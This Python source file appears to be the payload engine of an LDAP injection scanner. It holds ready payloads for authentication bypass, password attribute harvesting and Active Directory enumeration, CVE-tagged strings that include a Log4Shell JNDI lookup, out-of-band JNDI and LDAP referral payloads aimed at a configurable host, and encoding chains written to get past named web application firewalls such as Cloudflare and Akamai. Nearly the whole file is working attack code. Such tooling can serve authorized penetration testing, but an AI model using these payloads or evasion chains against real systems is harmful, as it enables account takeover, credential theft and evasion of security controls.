import re
import random
from dataclasses import dataclass
from typing import List, Set, Optional, Tuple, Dict, Any
from urllib.parse import quote
from .models import Payload, PayloadTier
from .patterns import LDAP_METACHAR_SET
from .utils import domain_to_dc, vprint

class Mutator:
    @staticmethod
    def url_encode(text: str) -> str: return quote(text)
    @staticmethod
    def double_url_encode(text: str) -> str: return quote(quote(text))
    @staticmethod
    def hex_encode(text: str) -> str: return "".join(f"\\{ord(c):02x}" for c in text)
    @staticmethod
    def hex_upper_encode(text: str) -> str: return "".join(f"\\{ord(c):02X}" for c in text)
    @staticmethod
    def null_middle_encode(text: str) -> str:
        if not text: return text
        mid = len(text) // 2; return text[:mid] + "\x00" + text[mid:]
    @staticmethod
    def html_entity_encode(text: str) -> str: return "".join(f"&#{ord(c)};" for c in text)
    @staticmethod
    def char_encode(text: str) -> str:
        rep = {"*": "\\2a", "(": "\\28", ")": "\\29", "&": "\\26", "|": "\\7c", "=": "\\3d", "\\": "\\5c", "\x00": "\\00", "/": "\\2f", ":": "\\3a", " ": "\\20"}
        return "".join(rep.get(c, c) for c in text)
    @staticmethod
    def case_mutate(text: str) -> str:
        def repl(m): s = m.group(0); return s.upper() if random.random() > 0.5 else s.lower()
        return re.sub(r'[a-zA-Z]{3,}', repl, text)
    @staticmethod
    def null_truncate(text: str) -> str: return text + "\x00"
    @staticmethod
    def null_byte_encode(text: str) -> str: return text + "%00"
    @staticmethod
    def double_url_structural(text: str) -> str:
        rep = {"*": "%252a", "(": "%2528", ")": "%2529", "&": "%2526", "|": "%257c", "=": "%253d"}
        return "".join(rep.get(c, c) for c in text)
    @staticmethod
    def unicode_fullwidth(text: str) -> str: return "".join(chr(ord(c) + 0xFEE0) if 0x21 <= ord(c) <= 0x7E else c for c in text)

class PayloadEngine:
    P = Payload
    TIER0_PROBES = [
        P("*", "T0: wildcard probe", "wildcard", PayloadTier.TIER0_PROBE, 10),
        P(")", "T0: paren syntax probe", "syntax", PayloadTier.TIER0_PROBE, 9),
        P(")(uid=*)(x=", "T0: structural inject probe", "structural", PayloadTier.TIER0_PROBE, 8),
    ]
    TIER1_CORE = [
        P("*)(uid=*))", "T1: uid auth bypass", "auth_bypass", PayloadTier.TIER1_CORE, 10, "any"),
        P("*(|(objectClass=*))", "T1: always-true objectClass", "bool_true", PayloadTier.TIER1_CORE, 10, "any"),
        P("admin)(|(a=b))", "T1: admin always-true OR", "auth_bypass", PayloadTier.TIER1_CORE, 9, "login"),
        P("*)(|(uid=*)(cn=*))", "T1: OR chain bypass", "or_chain", PayloadTier.TIER1_CORE, 9, "any"),
        P(")(uid=*))(|(uid=", "T1: double inject probe", "structural", PayloadTier.TIER1_CORE, 8, "any"),
        P("admin\x00", "T1: null byte truncation", "null_byte", PayloadTier.TIER1_CORE, 8, "any"),
        P("%2a%29%28uid%3d%2a%29%29", "T1: URL-enc bypass", "url_encoded", PayloadTier.TIER1_CORE, 7, "any", encoded_already=True),
        P("*)(|(sAMAccountName=*))", "T1: AD sAM bypass", "ad_bypass", PayloadTier.TIER1_CORE, 9, "any", "ad"),
        P("mail=*)(mail=*", "T1: attribute injection", "attr_inject", PayloadTier.TIER1_CORE, 8, "any"),
        P("cn=admin,dc=*", "T1: DN injection", "dn_inject", PayloadTier.TIER1_CORE, 8, "any"),
        P("admin)(sAMAccountName:1.2.840.113556.1.4.803:=512)", "T1-AD: OID Bitwise AND", "ad_bypass", PayloadTier.TIER1_CORE, 9, "any", "ad"),
        P("*)(|(userPassword=*)(unicodePwd=*)(shadowPassword=*))", "T1: Attr Enum (Auth)", "attr_harvest", PayloadTier.TIER1_CORE, 9, "any"),
    ]
    TIER1_AD = [P("*(|(sAMAccountName=Administrator))", "T1-AD: admin sAM probe", "ad_enum", PayloadTier.TIER1_CORE, 8, "any", "ad"), P("*(|(userPrincipalName=*))", "T1-AD: UPN wildcard", "ad_bypass", PayloadTier.TIER1_CORE, 8, "any", "ad")]
    TIER1_OPENLDAP = [P("*(|(uid=*))", "T1-OL: uid wildcard", "ol_bypass", PayloadTier.TIER1_CORE, 9, "any", "openldap"), P("*(|(uidNumber=0))", "T1-OL: root uid", "ol_enum", PayloadTier.TIER1_CORE, 8, "any", "openldap")]
    TIER1_SPRING = [P("*)(|(cn=*)(uid=*))", "T1-Spring: template bypass", "spring_ldap", PayloadTier.TIER1_CORE, 9, "login")]
    TIER1_SHIRO = [P("*)(uid=*)(", "T1-Shiro: realm bypass", "shiro_ldap", PayloadTier.TIER1_CORE, 10, "login")]
    TIER1_ASPNET = [P("admin)(&(objectClass=*))", "T1-ADSI: AND short-circuit", "adsi_bypass", PayloadTier.TIER1_CORE, 9, "login")]
    TIER2_BOOLEAN = [P("*(|(uid=a*))", "T2: TRUE uid prefix-a", "bool_true", PayloadTier.TIER2_BOOLEAN, 8), P("*(|(uid=ZZZQQQXXX99z*))", "T2: FALSE uid impossible", "bool_false", PayloadTier.TIER2_BOOLEAN, 8), P("*(|(objectClass=person))", "T2: TRUE objectClass person", "bool_true", PayloadTier.TIER2_BOOLEAN, 7), P("*(|(objectClass=ZZZZFAKE))", "T2: FALSE objectClass fake", "bool_false", PayloadTier.TIER2_BOOLEAN, 7)]
    CVE_PAYLOADS = [P("*)(uid=*)(", "CVE-2016-4437: Shiro realm", "cve_shiro", PayloadTier.TIER1_CORE, 10, "login"), P("*)(|(sAMAccountName=*))", "CVE-2019-3778: Spring LDAP", "cve_spring", PayloadTier.TIER1_CORE, 10, "login"), P("admin\x00", "CVE-2009-1184: null-byte trunc", "cve_null", PayloadTier.TIER1_CORE, 9, "any"), P("", "CVE-2021-33880: ldap3 empty bind", "cve_ldap3", PayloadTier.TIER1_CORE, 10, "login"), P("${jndi:ldap://oob.placeholder/a}", "CVE-2021-44228: Log4Shell JNDI", "cve_log4shell", PayloadTier.TIER4_OOB, 8, "any")]

    @classmethod
    def build_tier5_mutated(cls, base: List[Payload]) -> List[Payload]:
        mutated = []
        for p in base:
            mutated.append(cls.P(Mutator.hex_encode(p.raw), f"T5: hex {p.desc}", f"{p.technique}_hex", PayloadTier.TIER5_MUTATION, p.priority-1))
            mutated.append(cls.P(Mutator.char_encode(p.raw), f"T5: char {p.desc}", f"{p.technique}_enc", PayloadTier.TIER5_MUTATION, p.priority-1))
            if not p.encoded_already: mutated.append(cls.P(Mutator.double_url_encode(p.raw), f"T5: dbl-url {p.desc}", f"{p.technique}_denc", PayloadTier.TIER5_MUTATION, p.priority-2))
            if "\x00" not in p.raw: mutated.append(cls.P(Mutator.null_truncate(p.raw), f"T5: null-trunc {p.desc}", f"{p.technique}_null", PayloadTier.TIER5_MUTATION, p.priority-1))
            mutated.append(cls.P(Mutator.unicode_fullwidth(p.raw), f"T5: u-fw {p.desc}", f"{p.technique}_ufw", PayloadTier.TIER5_MUTATION, p.priority-2))
        return mutated

    @classmethod
    def build_dn_injection(cls, domain: str) -> List[Payload]:
        dc = domain_to_dc(domain); return [cls.P(f"*,{dc}", "T1: Apex Wildcard DN", "dn_inject", PayloadTier.TIER1_CORE, 6), cls.P(f"Administrator@{domain}", "T1-AD: UPN DN", "dn_inject", PayloadTier.TIER1_CORE, 8, "login", "ad")]

    _ENCODINGS = [("url", lambda s: quote(s, safe="")), ("double_url", lambda s: quote(quote(s, safe=""), safe="")), ("hex", lambda s: "".join(f"\\{ord(c):02x}" for c in s)), ("unicode_fw", lambda s: "".join(chr(ord(c) + 0xFEE0) if 0x21 <= ord(c) <= 0x7E else c for c in s))]

    @classmethod
    def _payload_ok(cls, raw: str, survived: Set[str]) -> bool:
        specials = {c for c in raw if c in LDAP_METACHAR_SET}; return specials.issubset(survived) if specials else True

    @classmethod
    def build_tier0(cls) -> List[Payload]: return list(cls.TIER0_PROBES)

    @classmethod
    def build_tier1(cls, server_type: str = "generic", framework: str = "generic", context: str = "any", survived: Optional[Set[str]] = None, failed: Optional[Set[str]] = None, include_cve: bool = True) -> List[Payload]:
        survived = survived or set(LDAP_METACHAR_SET); failed = failed or set(); payloads = list(cls.TIER1_CORE)
        if server_type in ("ad", "activedirectory"): payloads.extend(cls.TIER1_AD)
        elif server_type in ("openldap", "389ds"): payloads.extend(cls.TIER1_OPENLDAP)
        if framework == "spring": payloads.extend(cls.TIER1_SPRING)
        elif framework == "shiro": payloads.extend(cls.TIER1_SHIRO)
        elif framework == "aspnet": payloads.extend(cls.TIER1_ASPNET)
        if include_cve: payloads.extend([p for p in cls.CVE_PAYLOADS if p.tier == PayloadTier.TIER1_CORE])
        payloads = [p for p in payloads if p.context in ("any", context) and p.server in ("any", server_type, "generic") and cls._payload_ok(p.raw, survived) and p.raw not in failed]
        seen = set(); unique = []
        for p in payloads:
            if p.raw not in seen: seen.add(p.raw); unique.append(p)
        unique.sort(key=lambda p: -p.priority); return unique[:8]

    @classmethod
    def build_tier2(cls, survived: Optional[Set[str]] = None) -> List[Payload]:
        survived = survived or set(LDAP_METACHAR_SET); return [p for p in cls.TIER2_BOOLEAN if cls._payload_ok(p.raw, survived)]

    @classmethod
    def build_tier3_waf(cls, trigger: Payload, survived: Set[str], limit: int = 4) -> List[Payload]:
        variants = []
        for name, fn in cls._ENCODINGS:
            try:
                enc = fn(trigger.raw)
                if {c for c in enc if c in LDAP_METACHAR_SET}.issubset(survived) and enc != trigger.raw: variants.append(Payload(enc, f"T3-WAF [{name}]: {trigger.desc}", f"waf_{name}", PayloadTier.TIER3_WAF, trigger.priority-1))
            except Exception: pass
        return list(dict.fromkeys(variants))[:limit]

class PolymorphicBypassGenerator:
    _PRIMITIVES: List[Tuple[str, Any]] = [
        ("url1", lambda s: quote(s, safe="")), ("url2", lambda s: quote(quote(s, safe=""), safe="")),
        ("hex_lc", lambda s: "".join(f"\\{ord(c):02x}" for c in s)), ("hex_uc", lambda s: "".join(f"\\{ord(c):02X}" for c in s)),
        ("utf16", lambda s: s.encode("utf-16-le").hex()), ("html_ent", lambda s: "".join(f"&#{ord(c)};" for c in s)),
        ("null_mid", lambda s: s[:len(s)//2] + "\x00" + s[len(s)//2:] if s else s), ("null_sfx", lambda s: s + "%00"),
        ("ws_ins", lambda s: re.sub(r'(\()', r'\1 ', s)), ("case_mix", lambda s: "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))),
        ("attr_abbr", lambda s: re.sub(r'\bobjectClass\b', 'objectclass', s, flags=re.I)), ("paren_pad", lambda s: s.replace("(", "((").replace(")", "))")),
        ("cmt_ins", lambda s: s.replace(")(", ")(/* */")),
    ]
    def __init__(self, client: Any, cfg: Any):
        self._client = client; self._cfg = cfg; self._prim_ema = {n: 0.5 for n, _ in self._PRIMITIVES}
    def mark_success(self, name: str): self._prim_ema[name] = 0.85 * self._prim_ema.get(name, 0.5) + 0.15
    def mark_failure(self, name: str): self._prim_ema[name] = 0.85 * self._prim_ema.get(name, 0.5)
    def _payload_ok(self, raw: str) -> bool:
        survived = getattr(self._client, "_survived_chars", "*()|&\\")
        return all(c not in raw or c in survived for c in "*()|&\\")
    def generate(self, base: Payload, depth: int = 2, max_variants: int = 8) -> List[Payload]:
        seen = {base.raw}; queue = [(base.raw, [])]; variants = []
        for d in range(depth):
            next_q = []
            for raw, chain in queue:
                for pn, pf in sorted(self._PRIMITIVES, key=lambda x: -self._prim_ema.get(x[0], 0.5)):
                    if len(variants) >= max_variants: break
                    try: mut = pf(raw)
                    except: continue
                    if mut in seen or not mut or mut == raw or not self._payload_ok(mut): continue
                    seen.add(mut); new_c = chain + [pn]; variants.append(Payload(raw=mut, desc=f"T3-POLY [{'→'.join(new_c)}]: {base.desc}", technique=f"poly_{pn}", tier=PayloadTier.TIER3_WAF, priority=max(1, base.priority-d), encoded_already=True))
                    next_q.append((mut, new_c))
            queue = next_q
        return variants[:max_variants]

class TargetAwarePayloadAdaptor:
    _AD_ATTRS = ["sAMAccountName","userPrincipalName","mail","displayName","memberOf","distinguishedName","objectSid","pwdLastSet"]
    _OPENLDAP_ATTRS = ["uid","cn","mail","sn","givenName","dn","uidNumber","gidNumber","homeDirectory","loginShell","userPassword","shadowPassword"]
    _GENERIC_ATTRS = ["uid","cn","mail","sn","displayName","description","member"]
    def __init__(self, schema: List[str], stype: str, base_dn: str = "", groups: List[str] = None):
        self._schema = schema or []; self._stype = stype; self._base_dn = base_dn; self._groups = groups or []; self._payloads = []
    def build(self) -> List[Payload]:
        if self._payloads: return self._payloads
        attrs = list(dict.fromkeys(self._schema + (self._AD_ATTRS if self._stype=="ad" else self._OPENLDAP_ATTRS if self._stype in ("openldap","389ds") else self._GENERIC_ATTRS)))[:20]
        res = []
        for a in attrs[:8]: res.append(Payload(raw=f"*(|({a}=*))", desc=f"CTX: {a} wildcard bypass", technique="attr_bypass", tier=PayloadTier.TIER1_CORE, priority=8))
        res.append(Payload(raw=f"*(|{''.join(f'({a}=*)' for a in attrs[:5])})", desc="CTX: multi-attr OR bypass", technique="or_chain", tier=PayloadTier.TIER1_CORE, priority=9))
        for g in self._groups[:4]:
            sg = re.sub(r"[^a-zA-Z0-9 _-]", "", g)[:40]
            if sg: res.append(Payload(raw=f"*({'memberOf' if self._stype=='ad' else 'member'}=*{sg}*)", desc=f"CTX: group probe ({sg})", technique="group_enum", tier=PayloadTier.TIER1_CORE, priority=7))
        if self._base_dn: res.append(Payload(raw=f"*)(dn={self._base_dn[:80]}", desc=f"CTX: DN injection", technique="dn_inject", tier=PayloadTier.TIER1_CORE, priority=8))
        pw = "unicodePwd" if self._stype=="ad" else "userPassword"
        res.append(Payload(raw=f"*)(|({pw}=*)", desc=f"CTX: password harvest ({pw})", technique="attr_harvest", tier=PayloadTier.TIER1_CORE, priority=9))
        self._payloads = res; vprint(f"  [ContextPayloads] Built {len(res)} payloads"); return res
    @staticmethod
    def extract_group_hints(html: str) -> List[str]:
        cands = []
        for m in re.finditer(r'<option[^>]*value=["\']([^"\']{3,40})["\']', html, re.I): (cands.append(m.group(1).strip()) if re.match(r'^[a-zA-Z0-9 _-]+$', m.group(1).strip()) else None)
        for m in re.finditer(r'(?:data-role|aria-label|data-group)=["\']([^"\']{3,40})["\']', html, re.I): (cands.append(m.group(1).strip()) if re.match(r'^[a-zA-Z0-9 _-]+$', m.group(1).strip()) else None)
        return list(dict.fromkeys(cands))[:10]

class PolymorphicPayloadGenerator:
    @staticmethod
    def _hex_structural(text: str) -> str: return "".join(f"\\{ord(c):02x}" if c in "()=*|&\\" else c for c in text)
    @staticmethod
    def _hex_structural_upper(text: str) -> str: return "".join(f"\\{ord(c):02X}" if c in "()=*|&\\" else c for c in text)
    @staticmethod
    def _ws_pad(text: str) -> str: return text.replace("(", "(\t").replace("=", " = ")
    @staticmethod
    def _null_pre_special(text: str) -> str: return re.sub(r'([()=*|&\\])', r'%00\1', text)
    @staticmethod
    def _random_case_attrs(text: str) -> str:
        def _mutate(m) -> str: return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in m.group(0))
        return re.sub(r'[a-zA-Z]{3,}', _mutate, text)
    @staticmethod
    def _insert_newline_eq(text: str) -> str: return text.replace("=", "=\n", 1)
    @staticmethod
    def _double_url_structural(text: str) -> str:
        rep = {"(": "%2528", ")": "%2529", "*": "%252a", "=": "%253d", "|": "%257c", "&": "%2526"}
        return "".join(rep.get(c, c) for c in text)
    @staticmethod
    def _unicode_fullwidth(text: str) -> str: return "".join(chr(ord(c)+0xFEE0) if 0x21<=ord(c)<=0x7E else c for c in text)
    @classmethod
    def generate(cls, base: Payload, survived: Set[str], waf_name: str = "Generic", rounds: int = 8) -> List[Payload]:
        raw = base.raw; variants = []; seen = {raw}; base_strats = [("hex_struct", cls._hex_structural), ("hex_upper", cls._hex_structural_upper), ("ws_pad", cls._ws_pad), ("nl_eq", cls._insert_newline_eq), ("rand_case", cls._random_case_attrs), ("null_special", cls._null_pre_special), ("url_full", lambda s: quote(s, safe="")), ("dbl_url", lambda s: quote(quote(s, safe=""), safe="")), ("dbl_url_struct", cls._double_url_structural)]
        strats = ([("unicode_fw", cls._unicode_fullwidth), ("cf_dbl_hex", lambda s: "".join(f"%{ord(c):02x}" if c in "()=*|&\\" else c for c in quote(s, safe=""))), ("cf_null_mid", lambda s: s[:len(s)//2] + "\x00" + s[len(s)//2:])] + base_strats) if waf_name.lower() in ("cloudflare", "akamai", "imperva", "aws_waf") else base_strats
        for name, fn in strats[:rounds]:
            try:
                mut = fn(raw)
                if mut and mut != raw and mut not in seen:
                    spec = {c for c in mut if c in LDAP_METACHAR_SET}
                    if not spec or spec.issubset(survived): seen.add(mut); variants.append(Payload(raw=mut, desc=f"POLY-{name}: {base.desc}", technique=f"{base.technique}_{name}", tier=PayloadTier.TIER5_MUTATION, priority=base.priority-1))
            except: pass
        return variants
    @staticmethod
    def header_injection_variants(payload: str) -> Dict[str, str]:
        return {"X-Forwarded-For": payload, "X-Real-IP": payload, "X-Auth-User": payload, "X-Remote-User": payload, "X-Username": payload, "X-LDAP-Filter": payload, "Proxy-Authorization": f"Basic {quote(payload, safe='')}"}

class ChainedPayloadMutator:
    _MUTATION_FUNCS = {
        "raw": lambda x: x, "url": lambda x: quote(x), "double_url": lambda x: quote(quote(x)),
        "char_encode": Mutator.char_encode, "hex_lower": Mutator.hex_encode, "hex_upper": Mutator.hex_upper_encode,
        "null_truncate": lambda x: x + "\x00", "percent_null": lambda x: x + "%00",
        "html_entity": Mutator.html_entity_encode, "double_struct": Mutator.double_url_structural,
        "unicode_star": lambda x: x.replace("*", "\uff0a"), "unicode_lparen": lambda x: x.replace("(", "\uff08").replace(")", "\uff09"),
        "tab_inject": lambda x: x.replace(" ", "\t"), "cr_inject": lambda x: x.replace(" ", "\r\n "),
        "comment_inject": lambda x: re.sub(r'\s', "/**/", x),
    }
    _WAF_CHAINS = {
        "Cloudflare": [["char_encode", "url"], ["unicode_star", "url"], ["double_url"]],
        "ModSecurity": [["hex_upper", "url"], ["char_encode", "double_url"], ["html_entity"]],
        "Akamai": [["unicode_star", "unicode_lparen", "url"], ["double_struct"]],
        "generic": [["char_encode"], ["double_url"], ["hex_lower"], ["percent_null"]],
    }
    def __init__(self, memory: Any, survived: Set[str] = None, depth: int = 3):
        self._memory = memory; self._survived = survived or set("*()|\\&\\"); self._depth = depth
    def mutate(self, payload: Payload, waf_name: str = None, framework: str = "generic") -> List[Payload]:
        waf_key = waf_name or getattr(self._memory, "waf_name", "generic")
        chains = self._WAF_CHAINS.get(waf_key, self._WAF_CHAINS["generic"])
        mutated = []; seen = {payload.raw}
        for chain in chains[:6]:
            res = payload.raw
            for step in chain[:self._depth]:
                fn = self._MUTATION_FUNCS.get(step)
                if fn:
                    try: res = fn(res)
                    except: pass
            if res not in seen and res != payload.raw:
                seen.add(res); p = Payload(raw=res, desc=f"{payload.desc} [chain:{'+'.join(chain)}]", technique=payload.technique, tier=PayloadTier.TIER5_MUTATION, encoded_already=True); mutated.append(p)
        return mutated

    @classmethod
    def build_tier4_oob(cls, host: str, scan_id: str) -> List[Payload]:
        if not host: return []
        h = host.rstrip("/"); uid = scan_id[:8]; return [Payload(f")(|(objectClass=ldap://{h}/{uid}))", "T4-OOB: referral", "oob_referral", PayloadTier.TIER4_OOB, 9), Payload(f"${{jndi:ldap://{h}/{uid}}}", "T4-OOB: JNDI", "oob_referral", PayloadTier.TIER4_OOB, 9)]

    @classmethod
    def build_tier6_second_order(cls, uid: str) -> List[Payload]:
        m = f"HELLHOUND_{uid}"; return [Payload(m, "T6: marker", "second_order", PayloadTier.TIER6_SECOND_ORDER, 10), Payload(f"{m}*)(uid=*", "T6: break-out", "second_order", PayloadTier.TIER6_SECOND_ORDER, 9)]
